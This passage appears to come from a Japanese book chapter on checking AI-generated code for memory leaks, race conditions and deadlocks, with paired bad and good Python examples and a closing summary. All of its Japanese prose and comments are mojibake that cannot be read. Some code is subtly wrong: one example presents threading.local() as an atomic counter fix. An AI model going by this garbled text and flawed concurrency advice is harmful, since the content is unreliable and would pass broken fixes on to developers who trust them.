                type="CIRCULAR_REFERENCE",
                description="å¾ªç’°å‚ç…§ã«ã‚ˆã‚‹ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ã®å¯èƒ½æ€§",
                location=ref.location,
                involved_objects=ref.objects,
                fix_suggestion=self._suggest_weak_reference(ref)
            )
            findings.append(finding)
        
        return findings
    
    def _detect_circular_references(
        self,
        code_ast: ast.AST
    ) -> List[CircularReference]:
        """å¾ªç’°å‚ç…§ã®æ¤œå‡º"""
        
        references = []
        
        # ã‚¯ãƒ©ã‚¹å®šç¾©ã‚’åé›†
        classes = {}
        for node in ast.walk(code_ast):
            if isinstance(node, ast.ClassDef):
                classes[node.name] = self._analyze_class_references(node)
        
        # å‚ç…§ã‚°ãƒ©ãƒ•ã‚’æ§‹ç¯‰
        ref_graph = self._build_reference_graph(classes)
        
        # å¾ªç’°ã‚’æ¤œå‡ºï¼ˆDFSï¼‰
        cycles = self._find_cycles_in_graph(ref_graph)
        
        for cycle in cycles:
            # å¾ªç’°ãŒå•é¡Œã¨ãªã‚‹ã‹ã‚’åˆ¤å®š
            if self._is_problematic_cycle(cycle, classes):
                references.append(CircularReference(
                    objects=cycle,
                    location=self._get_cycle_location(cycle, classes),
                    description=self._describe_cycle(cycle)
                ))
        
        return references
    
    def _pattern_based_detection(
        self,
        code_ast: ast.AST
    ) -> List[PatternLeakFinding]:
        """ãƒ‘ã‚¿ãƒ¼ãƒ³ãƒ™ãƒ¼ã‚¹ã®ãƒªãƒ¼ã‚¯æ¤œå‡º"""
        
        findings = []
        
        # ãƒ‘ã‚¿ãƒ¼ãƒ³1: ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã¸ã®å¤§é‡ãƒ‡ãƒ¼ã‚¿è“„ç©
        global_accumulation = self._detect_global_accumulation(code_ast)
        findings.extend(global_accumulation)
        
        # ãƒ‘ã‚¿ãƒ¼ãƒ³2: ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã®ç„¡åˆ¶é™æˆé•·
        unbounded_cache = self._detect_unbounded_cache(code_ast)
        findings.extend(unbounded_cache)
        
        # ãƒ‘ã‚¿ãƒ¼ãƒ³3: ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã®è§£é™¤å¿˜ã‚Œ
        dangling_listeners = self._detect_dangling_listeners(code_ast)
        findings.extend(dangling_listeners)
        
        # ãƒ‘ã‚¿ãƒ¼ãƒ³4: å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸è¦ãªä¿æŒ
        large_object_retention = self._detect_large_object_retention(code_ast)
        findings.extend(large_object_retention)
        
        return findings
```

**å…·ä½“çš„ãªãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨å¯¾ç­–**

```python
class MemoryLeakPatterns:
    """ä¸€èˆ¬çš„ãªãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨å¯¾ç­–"""
    
    def demonstrate_file_handle_leak(self):
        """ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ³ãƒ‰ãƒ«ãƒªãƒ¼ã‚¯ã®ä¾‹ã¨å¯¾ç­–"""
        
        # æ‚ªã„ä¾‹ï¼šAIãŒç”Ÿæˆã—ãŒã¡ãªã‚³ãƒ¼ãƒ‰
        def read_files_bad(file_list):
            results = []
            for filename in file_list:
                f = open(filename, 'r')  # ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ã
                content = f.read()
                # f.close() ã‚’å¿˜ã‚Œã¦ã„ã‚‹ï¼
                results.append(content)
            return results
        
        # è‰¯ã„ä¾‹ï¼šã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚’ä½¿ç”¨
        def read_files_good(file_list):
            results = []
            for filename in file_list:
                with open(filename, 'r') as f:
                    content = f.read()
                    results.append(content)
            return results
        
        # ã‚ˆã‚Šå …ç‰¢ãªä¾‹ï¼šä¾‹å¤–å‡¦ç†ã‚‚è€ƒæ…®
        def read_files_robust(file_list):
            results = []
            for filename in file_list:
                try:
                    with open(filename, 'r') as f:
                        content = f.read()
                        results.append(content)
                except IOError as e:
                    logging.error(f"Failed to read {filename}: {e}")
                    results.append(None)
            return results
    
    def demonstrate_cache_memory_leak(self):
        """ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ã‚ˆã‚‹ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ã®ä¾‹ã¨å¯¾ç­–"""
        
        # æ‚ªã„ä¾‹ï¼šç„¡åˆ¶é™ã«æˆé•·ã™ã‚‹ã‚­ãƒ£ãƒƒã‚·ãƒ¥
        class BadCache:
            def __init__(self):
                self.cache = {}
            
            def get(self, key):
                if key not in self.cache:
                    self.cache[key] = self._expensive_computation(key)
                return self.cache[key]
        
        # è‰¯ã„ä¾‹ï¼šLRUã‚­ãƒ£ãƒƒã‚·ãƒ¥ã§åˆ¶é™
        from functools import lru_cache
        from collections import OrderedDict
        
        class GoodCache:
            def __init__(self, max_size=1000):
                self.cache = OrderedDict()
                self.max_size = max_size
            
            def get(self, key):
                if key in self.cache:
                    # LRU: æœ€è¿‘ä½¿ç”¨ã—ãŸã‚‚ã®ã‚’æœ«å°¾ã«ç§»å‹•
                    self.cache.move_to_end(key)
                    return self.cache[key]
                
                # æ–°ã—ã„å€¤ã‚’è¨ˆç®—
                value = self._expensive_computation(key)
                
                # ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«è¿½åŠ 
                self.cache[key] = value
                
                # ã‚µã‚¤ã‚ºåˆ¶é™ã‚’è¶…ãˆãŸã‚‰å¤ã„ã‚‚ã®ã‚’å‰Šé™¤
                if len(self.cache) > self.max_size:
                    self.cache.popitem(last=False)
                
                return value
        
        # ã•ã‚‰ã«è‰¯ã„ä¾‹ï¼šå¼±å‚ç…§ã‚’ä½¿ç”¨
        import weakref
        
        class WeakCache:
            def __init__(self):
                self.cache = weakref.WeakValueDictionary()
            
            def get(self, key):
                value = self.cache.get(key)
                if value is None:
                    value = self._expensive_computation(key)
                    self.cache[key] = value
                return value
    
    def demonstrate_event_listener_leak(self):
        """ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã®ãƒªãƒ¼ã‚¯ã¨å¯¾ç­–"""
        
        # æ‚ªã„ä¾‹ï¼šãƒªã‚¹ãƒŠãƒ¼ã®è§£é™¤å¿˜ã‚Œ
        class BadEventManager:
            def __init__(self):
                self.listeners = []
            
            def add_listener(self, listener):
                self.listeners.append(listener)
            
            # remove_listenerãƒ¡ã‚½ãƒƒãƒ‰ãŒãªã„ï¼
        
        # è‰¯ã„ä¾‹ï¼šé©åˆ‡ãªãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ç®¡ç†
        class GoodEventManager:
            def __init__(self):
                self.listeners = []
            
            def add_listener(self, listener):
                self.listeners.append(listener)
                # ãƒªã‚¹ãƒŠãƒ¼è§£é™¤ç”¨ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¿”ã™
                return len(self.listeners) - 1
            
            def remove_listener(self, token):
                if 0 <= token < len(self.listeners):
                    self.listeners[token] = None  # å‰Šé™¤ã®ä»£ã‚ã‚Šã«None
            
            def cleanup(self):
                # Noneè¦ç´ ã‚’å®šæœŸçš„ã«ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—
                self.listeners = [l for l in self.listeners if l is not None]
        
        # ã•ã‚‰ã«è‰¯ã„ä¾‹ï¼šå¼±å‚ç…§ã§ãƒªã‚¹ãƒŠãƒ¼ã‚’ä¿æŒ
        class BestEventManager:
            def __init__(self):
                self.listeners = weakref.WeakSet()
            
            def add_listener(self, listener):
                self.listeners.add(listener)
            
            def notify(self, event):
                # å¼±å‚ç…§ãªã®ã§ã€å‚ç…§ã•ã‚Œãªããªã£ãŸãƒªã‚¹ãƒŠãƒ¼ã¯
                # è‡ªå‹•çš„ã«ã‚»ãƒƒãƒˆã‹ã‚‰å‰Šé™¤ã•ã‚Œã‚‹
                for listener in self.listeners:
                    listener.handle_event(event)
```

### 5.3.3 ä¸¦è¡Œæ€§å•é¡Œã®ç‰¹å®š

**ãªãœAIã¯ä¸¦è¡Œæ€§å•é¡Œã‚’è¦‹é€ƒã—ã‚„ã™ã„ã®ã‹**

AIã®å­¦ç¿’ãƒ‡ãƒ¼ã‚¿ã«ã¯å˜ä¸€ã‚¹ãƒ¬ãƒƒãƒ‰ã®ã‚³ãƒ¼ãƒ‰ãŒå¤šã„å‚¾å‘ãŒã‚ã‚Šã€ä¸¦è¡Œå‡¦ç†ã®è¤‡é›‘ã•ã¯å‡ºåŠ›ã ã‘ã§ååˆ†ã«è€ƒæ…®ã•ã‚Œãªã„å ´åˆãŒã‚ã‚‹ã€‚ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã€ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯ã€ãƒ‡ãƒ¼ã‚¿ç«¶åˆãªã©ã®å•é¡Œã¯ã€å®Ÿè¡Œã‚¿ã‚¤ãƒŸãƒ³ã‚°ã«ä¾å­˜ã™ã‚‹ãŸã‚ã€é™çš„ãªã‚³ãƒ¼ãƒ‰ç”Ÿæˆã§ã¯è€ƒæ…®ã•ã‚Œã«ãã„ã€‚

**ä¸¦è¡Œæ€§å•é¡Œæ¤œå‡ºå™¨ã®å®Ÿè£…**

```python
class ConcurrencyIssueDetector:
    """ä¸¦è¡Œæ€§å•é¡Œã®æ¤œå‡ºã¨åˆ†æ"""
    
    def __init__(self):
        self.race_detector = RaceConditionDetector()
        self.deadlock_detector = DeadlockDetector()
        self.synchronization_analyzer = SynchronizationAnalyzer()
    
    def analyze_concurrency(
        self,
        code_ast: ast.AST,
        concurrency_model: ConcurrencyModel
    ) -> ConcurrencyAnalysisReport:
        """ä¸¦è¡Œæ€§å•é¡Œã®åŒ…æ‹¬çš„åˆ†æ"""
        
        report = ConcurrencyAnalysisReport()
        
        # å…±æœ‰ãƒªã‚½ãƒ¼ã‚¹ã®ç‰¹å®š
        shared_resources = self._identify_shared_resources(code_ast)
        report.shared_resources = shared_resources
        
        # ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®æ¤œå‡º
        race_conditions = self.race_detector.detect(
            code_ast,
            shared_resources,
            concurrency_model
        )
        report.race_conditions = race_conditions
        
        # ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯ã®å¯èƒ½æ€§
        deadlock_risks = self.deadlock_detector.analyze(
            code_ast,
            shared_resources
        )
        report.deadlock_risks = deadlock_risks
        
        # åŒæœŸãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã®è©•ä¾¡
        sync_issues = self.synchronization_analyzer.evaluate(
            code_ast,
            concurrency_model
        )
        report.synchronization_issues = sync_issues
        
        # æ¨å¥¨äº‹é …ã®ç”Ÿæˆ
        report.recommendations = self._generate_recommendations(report)
        
        return report
    
    def _identify_shared_resources(
        self,
        code_ast: ast.AST
    ) -> List[SharedResource]:
        """å…±æœ‰ãƒªã‚½ãƒ¼ã‚¹ã®ç‰¹å®š"""
        
        resources = []
        
        # ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°
        global_vars = self._find_global_variables(code_ast)
        for var in global_vars:
            if self._is_mutable(var):
                resources.append(SharedResource(
                    name=var.name,
                    type="GLOBAL_VARIABLE",
                    access_points=self._find_access_points(code_ast, var)
                ))
        
        # ã‚¯ãƒ©ã‚¹å¤‰æ•°
        class_vars = self._find_class_variables(code_ast)
        for var in class_vars:
            if self._is_shared_across_instances(var):
                resources.append(SharedResource(
                    name=var.name,
                    type="CLASS_VARIABLE",
                    access_points=self._find_access_points(code_ast, var)
                ))
        
        # ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶š
        external_resources = self._find_external_resources(code_ast)
        resources.extend(external_resources)
        
        return resources

class RaceConditionDetector:
    """ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®æ¤œå‡º"""
    
    def detect(
        self,
        code_ast: ast.AST,
        shared_resources: List[SharedResource],
        concurrency_model: ConcurrencyModel
    ) -> List[RaceCondition]:
        """ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®æ¤œå‡º"""
        
        race_conditions = []
        
        for resource in shared_resources:
            # ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’åˆ†æ
            access_patterns = self._analyze_access_patterns(
                resource,
                code_ast
            )
            
            # å±é™ºãªãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ¤œå‡º
            for pattern in access_patterns:
                if pattern.type == "CHECK_THEN_ACT":
                    # å…¸å‹çš„ãªãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³
                    race = RaceCondition(
                        type="CHECK_THEN_ACT",
                        resource=resource,
                        location=pattern.location,
                        description="ãƒã‚§ãƒƒã‚¯ã¨æ“ä½œã®é–“ã«ç«¶åˆçŠ¶æ…‹",
                        example=self._generate_race_example(pattern),
                        fix=self._generate_synchronization_fix(pattern)
                    )
                    race_conditions.append(race)
                
                elif pattern.type == "READ_MODIFY_WRITE":
                    # èª­ã¿è¾¼ã¿-å¤‰æ›´-æ›¸ãè¾¼ã¿ã®ç«¶åˆ
                    race = RaceCondition(
                        type="READ_MODIFY_WRITE",
                        resource=resource,
                        location=pattern.location,
                        description="éã‚¢ãƒˆãƒŸãƒƒã‚¯ãªæ›´æ–°æ“ä½œ",
                        severity="HIGH"
                    )
                    race_conditions.append(race)
        
        return race_conditions
    
    def _generate_race_example(self, pattern: AccessPattern) -> str:
        """ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®ä¾‹ã‚’ç”Ÿæˆ"""
        
        if pattern.type == "CHECK_THEN_ACT":
            return '''
            # å±é™ºãªã‚³ãƒ¼ãƒ‰ï¼ˆãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ï¼‰
            if not os.path.exists(filename):  # ãƒã‚§ãƒƒã‚¯
                # ã“ã“ã§ä»–ã®ã‚¹ãƒ¬ãƒƒãƒ‰ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹å¯èƒ½æ€§
                with open(filename, 'w') as f:  # æ“ä½œ
                    f.write(data)
            
            # å®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼ˆã‚¢ãƒˆãƒŸãƒƒã‚¯æ“ä½œï¼‰
            try:
                # æ’ä»–çš„ä½œæˆãƒ¢ãƒ¼ãƒ‰ã§é–‹ã
                with open(filename, 'x') as f:
                    f.write(data)
            except FileExistsError:
                # ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ—¢ã«å­˜åœ¨ã™ã‚‹å ´åˆã®å‡¦ç†
                pass
            '''
        
        elif pattern.type == "READ_MODIFY_WRITE":
            return '''
            # å±é™ºãªã‚³ãƒ¼ãƒ‰ï¼ˆéã‚¢ãƒˆãƒŸãƒƒã‚¯ï¼‰
            count = shared_counter  # èª­ã¿è¾¼ã¿
            count += 1             # å¤‰æ›´
            shared_counter = count  # æ›¸ãè¾¼ã¿
            
            # å®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼ˆãƒ­ãƒƒã‚¯ä½¿ç”¨ï¼‰
            with counter_lock:
                shared_counter += 1
            
            # ã¾ãŸã¯ã€ã‚¢ãƒˆãƒŸãƒƒã‚¯æ“ä½œã‚’ä½¿ç”¨
            import threading
            counter = threading.local()
            '''

class DeadlockDetector:
    """ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯ã®æ¤œå‡º"""
    
    def analyze(
        self,
        code_ast: ast.AST,
        shared_resources: List[SharedResource]
    ) -> List[DeadlockRisk]:
        """ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯ã®ãƒªã‚¹ã‚¯åˆ†æ"""
        
        risks = []
        
        # ãƒ­ãƒƒã‚¯å–å¾—é †åºã®åˆ†æ
        lock_orders = self._analyze_lock_acquisition_order(code_ast)
        
        # å¾ªç’°å¾…æ©Ÿã®æ¤œå‡º
        circular_waits = self._detect_circular_waits(lock_orders)
        
        for circular_wait in circular_waits:
            risk = DeadlockRisk(
                type="CIRCULAR_WAIT",
                involved_locks=circular_wait.locks,
                code_paths=circular_wait.paths,
                description=self._describe_deadlock(circular_wait),
                prevention_strategy=self._suggest_prevention(circular_wait)
            )
            risks.append(risk)
        
        # ãƒã‚¹ãƒˆã—ãŸãƒ­ãƒƒã‚¯ã®æ¤œå‡º
        nested_locks = self._find_nested_locks(code_ast)
        for nested in nested_locks:
            if nested.is_risky:
                risk = DeadlockRisk(
                    type="NESTED_LOCKS",
                    location=nested.location,
                    description="ãƒã‚¹ãƒˆã—ãŸãƒ­ãƒƒã‚¯å–å¾—",
                    prevention_strategy="ãƒ­ãƒƒã‚¯é †åºã®çµ±ä¸€ã¾ãŸã¯ãƒ­ãƒƒã‚¯ãƒ•ãƒªãƒ¼è¨­è¨ˆ"
                )
                risks.append(risk)
        
        return risks
    
    def _suggest_prevention(self, circular_wait: CircularWait) -> str:
        """ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯é˜²æ­¢ç­–ã®ææ¡ˆ"""
        
        return '''
        ãƒ‡ãƒƒãƒ‰ãƒ­ãƒƒã‚¯é˜²æ­¢ã®ãŸã‚ã®æˆ¦ç•¥ï¼š
        
        1. ãƒ­ãƒƒã‚¯é †åºã®çµ±ä¸€
        ```python
        # ã™ã¹ã¦ã®ã‚¹ãƒ¬ãƒƒãƒ‰ã§åŒã˜é †åºã§ãƒ­ãƒƒã‚¯ã‚’å–å¾—
        locks = sorted([lock_a, lock_b], key=id)
        for lock in locks:
            lock.acquire()
        try:
            # ã‚¯ãƒªãƒ†ã‚£ã‚«ãƒ«ã‚»ã‚¯ã‚·ãƒ§ãƒ³
            pass
        finally:
            for lock in reversed(locks):
                lock.release()
        ```
        
        2. ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã®ä½¿ç”¨
        ```python
        if lock_a.acquire(timeout=1.0):
            try:
                if lock_b.acquire(timeout=1.0):
                    try:
                        # å‡¦ç†
                        pass
                    finally:
                        lock_b.release()
                else:
                    # ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆæ™‚ã®å‡¦ç†
                    pass
            finally:
                lock_a.release()
        ```
        
        3. ãƒ­ãƒƒã‚¯ãƒ•ãƒªãƒ¼ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã®ä½¿ç”¨
        ```python
        from queue import Queue
        # ã‚¹ãƒ¬ãƒƒãƒ‰ã‚»ãƒ¼ãƒ•ãªã‚­ãƒ¥ãƒ¼ã‚’ä½¿ç”¨
        task_queue = Queue()
        ```
        '''
```

**ä¸¦è¡Œæ€§å•é¡Œã®å®Ÿè·µçš„ãªè§£æ±ºãƒ‘ã‚¿ãƒ¼ãƒ³**

```python
class ConcurrencySolutions:
    """ä¸¦è¡Œæ€§å•é¡Œã®è§£æ±ºãƒ‘ã‚¿ãƒ¼ãƒ³é›†"""
    
    def demonstrate_thread_safe_singleton(self):
        """ã‚¹ãƒ¬ãƒƒãƒ‰ã‚»ãƒ¼ãƒ•ãªã‚·ãƒ³ã‚°ãƒ«ãƒˆãƒ³ãƒ‘ã‚¿ãƒ¼ãƒ³"""
        
        # å±é™ºãªå®Ÿè£…ï¼ˆAIãŒç”Ÿæˆã—ãŒã¡ãªï¼‰
        class UnsafeSingleton:
            _instance = None
            
            def __new__(cls):
                if cls._instance is None:
                    # ã“ã“ã§ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚¹ã‚¤ãƒƒãƒãŒç™ºç”Ÿã™ã‚‹ã¨
                    # è¤‡æ•°ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãŒä½œæˆã•ã‚Œã‚‹å¯èƒ½æ€§
                    cls._instance = super().__new__(cls)
                return cls._instance
        
        # å®‰å…¨ãªå®Ÿè£…ï¼ˆãƒ€ãƒ–ãƒ«ãƒã‚§ãƒƒã‚¯ãƒ­ãƒƒã‚­ãƒ³ã‚°ï¼‰
        import threading
        
        class SafeSingleton:
            _instance = None
            _lock = threading.Lock()
            
            def __new__(cls):
                # é«˜é€Ÿãƒ‘ã‚¹ï¼ˆãƒ­ãƒƒã‚¯ãªã—ï¼‰
                if cls._instance is None:
                    with cls._lock:
                        # ãƒ­ãƒƒã‚¯å–å¾—å¾Œã«å†ãƒã‚§ãƒƒã‚¯
                        if cls._instance is None:
                            cls._instance = super().__new__(cls)
                return cls._instance
        
        # Pythonã§ã®ã‚ˆã‚Šç°¡æ½”ãªæ–¹æ³•
        class PythonicSingleton:
            # ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãƒ¬ãƒ™ãƒ«ã®å¤‰æ•°ã¯Pythonã§ã‚¹ãƒ¬ãƒƒãƒ‰ã‚»ãƒ¼ãƒ•
            pass
        
        _singleton_instance = PythonicSingleton()
        
        def get_singleton():
            return _singleton_instance
    
    def demonstrate_producer_consumer(self):
        """ãƒ—ãƒ­ãƒ‡ãƒ¥ãƒ¼ã‚µãƒ¼ãƒ»ã‚³ãƒ³ã‚·ãƒ¥ãƒ¼ãƒãƒ¼ãƒ‘ã‚¿ãƒ¼ãƒ³"""
        
        import queue
        import threading
        
        class ThreadSafeProducerConsumer:
            def __init__(self, max_size=100):
                self.queue = queue.Queue(maxsize=max_size)
                self.stop_event = threading.Event()
            
            def producer(self, data_source):
                """ãƒ‡ãƒ¼ã‚¿ã‚’ç”Ÿæˆã—ã¦ã‚­ãƒ¥ãƒ¼ã«è¿½åŠ """
                for item in data_source:
                    try:
                        # ãƒ–ãƒ­ãƒƒã‚­ãƒ³ã‚° putï¼ˆã‚­ãƒ¥ãƒ¼ãŒæº€æ¯ãªã‚‰å¾…æ©Ÿï¼‰
                        self.queue.put(item, timeout=1.0)
                    except queue.Full:
                        if self.stop_event.is_set():
                            break
                        # ãƒªãƒˆãƒ©ã‚¤ã¾ãŸã¯ã‚¨ãƒ©ãƒ¼å‡¦ç†
                
                # çµ‚äº†ã‚·ã‚°ãƒŠãƒ«
                self.queue.put(None)
            
            def consumer(self, processor):
                """ã‚­ãƒ¥ãƒ¼ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã—ã¦å‡¦ç†"""
                while not self.stop_event.is_set():
                    try:
                        # ãƒ–ãƒ­ãƒƒã‚­ãƒ³ã‚° getï¼ˆã‚­ãƒ¥ãƒ¼ãŒç©ºãªã‚‰å¾…æ©Ÿï¼‰
                        item = self.queue.get(timeout=1.0)
                        
                        if item is None:  # çµ‚äº†ã‚·ã‚°ãƒŠãƒ«
                            # ä»–ã®ã‚³ãƒ³ã‚·ãƒ¥ãƒ¼ãƒãƒ¼ã®ãŸã‚ã«æˆ»ã™
                            self.queue.put(None)
                            break
                        
                        # ãƒ‡ãƒ¼ã‚¿å‡¦ç†
                        processor(item)
                        
                        # å‡¦ç†å®Œäº†ã‚’é€šçŸ¥
                        self.queue.task_done()
                        
                    except queue.Empty:
                        continue
                    except Exception as e:
                        # ã‚¨ãƒ©ãƒ¼ãƒ­ã‚°
                        self.handle_error(e, item)
            
            def shutdown(self):
                """ã‚°ãƒ¬ãƒ¼ã‚¹ãƒ•ãƒ«ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³"""
                self.stop_event.set()
                # ã™ã¹ã¦ã®ã‚¿ã‚¹ã‚¯ã®å®Œäº†ã‚’å¾…ã¤
                self.queue.join()
    
    def demonstrate_async_patterns(self):
        """éåŒæœŸãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã‚ˆã‚‹ä¸¦è¡Œæ€§å•é¡Œã®å›é¿"""
        
        import asyncio
        import aiohttp
        
        class AsyncConcurrentRequests:
            def __init__(self):
                self.session = None
                self.semaphore = asyncio.Semaphore(10)  # åŒæ™‚æ¥ç¶šæ•°åˆ¶é™
            
            async def __aenter__(self):
                self.session = aiohttp.ClientSession()
                return self
            
            async def __aexit__(self, exc_type, exc_val, exc_tb):
                await self.session.close()
            
            async def fetch_url(self, url):
                """ã‚»ãƒãƒ•ã‚©ã§åŒæ™‚æ¥ç¶šæ•°ã‚’åˆ¶é™"""
                async with self.semaphore:
                    try:
                        async with self.session.get(url) as response:
                            return await response.text()
                    except Exception as e:
                        # ã‚¨ãƒ©ãƒ¼å‡¦ç†
                        return None
            
            async def fetch_multiple(self, urls):
                """è¤‡æ•°URLã®ä¸¦è¡Œå–å¾—"""
                tasks = [self.fetch_url(url) for url in urls]
                
                # ã™ã¹ã¦ã®çµæœã‚’å¾…ã¤
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # ã‚¨ãƒ©ãƒ¼ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°
                return [
                    result for result in results
                    if not isinstance(result, Exception)
                ]
```

## ã¾ã¨ã‚ï¼šå®Ÿè·µçš„ãªæ¤œè¨¼æŠ€æ³•ã®çµ±åˆ

æœ¬ç« ã§ã¯ã€AIç”Ÿæˆã‚³ãƒ¼ãƒ‰ã®å“è³ªã‚’ç¢ºä¿ã™ã‚‹ãŸã‚ã®å®Ÿè·µçš„ãªæ¤œè¨¼æŠ€æ³•ã‚’è©³ã—ãæ¢æ±‚ã—ãŸã€‚ä¸»è¦ãªå­¦ã³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã‚ã‚‹ï¼š

1. **å¢ƒç•Œå€¤ã¨ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã®ä½“ç³»çš„ãªæ¢ç´¢**
   - AIã®çµ±è¨ˆçš„ãƒã‚¤ã‚¢ã‚¹ã«ã‚ˆã‚‹ç›²ç‚¹ã®ç†è§£
   - ã‚·ã‚¹ãƒ†ãƒãƒ†ã‚£ãƒƒã‚¯ãªå¢ƒç•Œå€¤æ¢ç´¢ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯
   - è‡ªå‹•ç”Ÿæˆã«ã‚ˆã‚‹ç¶²ç¾…çš„ãªãƒ†ã‚¹ãƒˆ

2. **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ›ãƒ¼ãƒ«ã®åŒ…æ‹¬çš„ãªæ¤œå‡º**
   - å…¥åŠ›æ¤œè¨¼ã®å¤šå±¤çš„ãªãƒã‚§ãƒƒã‚¯
   - èªè¨¼ãƒ»èªå¯ã®é©åˆ‡ãªå®Ÿè£…ç¢ºèª
   - OWASP Top 10ã«åŸºã¥ãä½“ç³»çš„ãªè©•ä¾¡

3. **ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹å•é¡Œã®æ—©æœŸç™ºè¦‹**
   - è¨ˆç®—é‡ã®é™çš„è§£æã«ã‚ˆã‚‹å•é¡Œäºˆæ¸¬
   - ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ãƒ‘ã‚¿ãƒ¼ãƒ³ã®èªè­˜ã¨å¯¾ç­–
   - ä¸¦è¡Œæ€§å•é¡Œã®æ¤œå‡ºã¨è§£æ±º

ã“ã‚Œã‚‰ã®æŠ€æ³•ã¯ã€å€‹åˆ¥ã«ä½¿ç”¨ã™ã‚‹ã®ã§ã¯ãªãã€çµ±åˆçš„ã«é©ç”¨ã™ã‚‹ã“ã¨ã§æœ€å¤§ã®åŠ¹æœã‚’ç™ºæ®ã™ã‚‹ã€‚æ¬¡ç« ã§ã¯ã€ã“ã‚Œã‚‰ã®æ¤œè¨¼æŠ€æ³•ã‚’è‡ªå‹•åŒ–ã—ã€AIã¨äººé–“ãŒå”èª¿ã—ã¦ãƒ†ã‚¹ãƒˆã‚’å®Ÿæ–½ã™ã‚‹æ–¹æ³•ã‚’æ¢æ±‚ã™ã‚‹ã€‚

---

## ã“ã®ç« ã®ã¾ã¨ã‚ã¨ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

### ã“ã®ç« ã®ã¾ã¨ã‚

- AIç”Ÿæˆã‚³ãƒ¼ãƒ‰ã«å¯¾ã™ã‚‹é™çš„è§£æãƒ»å‹•çš„ãƒ†ã‚¹ãƒˆãƒ»ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆç­‰ã®å…·ä½“çš„ãªæ¤œè¨¼æŠ€æ³•ã‚’æ•´ç†ã—ã€ãã‚Œãã‚Œã®å¾—æ„é ˜åŸŸã¨é™ç•Œã‚’ç¤ºã—ãŸã€‚
